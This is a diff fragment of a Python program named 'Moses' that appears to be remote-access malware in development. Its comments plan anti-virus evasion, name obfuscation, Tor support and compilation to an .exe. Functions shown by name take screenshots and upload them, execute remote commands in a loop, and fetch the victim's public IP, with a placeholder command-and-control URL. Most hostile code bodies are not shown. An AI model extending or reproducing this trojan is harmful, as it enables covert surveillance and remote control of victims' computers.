@@ -6,7 +6,6 @@ from datetime import datetime
 # TODO: cut down on extra-modules...
 # TODO: obfuscate all function and variable names after completion
 # TODO: setup tor capability
-# TODO: change all os.system commands to subprocess (check ssh_chat program)
 # TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
 # TODO: check anti-virus evasion/efficacy again
 # TODO: implement kill command
@@ -21,9 +20,11 @@ from datetime import datetime
 # 6) Compile Moses to .exe using pyinstaller
 #
 
+
+
 def main():
     URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
-    master_filename = "moses.py"
+    master_filename = "moses.exe"
 
     win_user = get_win_user()
 
@@ -185,7 +186,7 @@ def take_screenshot(win_user): # 2
 
     upload_file(filename)
 
-def execute_command(command, win_user): # subprocess here... output the stdout to a variable, a text file, to mega, then remove
+def execute_command(command, win_user):
     counter = 0
 
     while (True):
@@ -215,6 +216,7 @@ def execute_command(command, win_user): # subprocess here... output the stdout t
             break
 
 # TODO: test this
+# literally just downloading the IP from http://icanhazip.com
 def get_pub_ip_address(win_user):
     # TODO: edit the get_web_content() function to take full URLs in the future
     try:
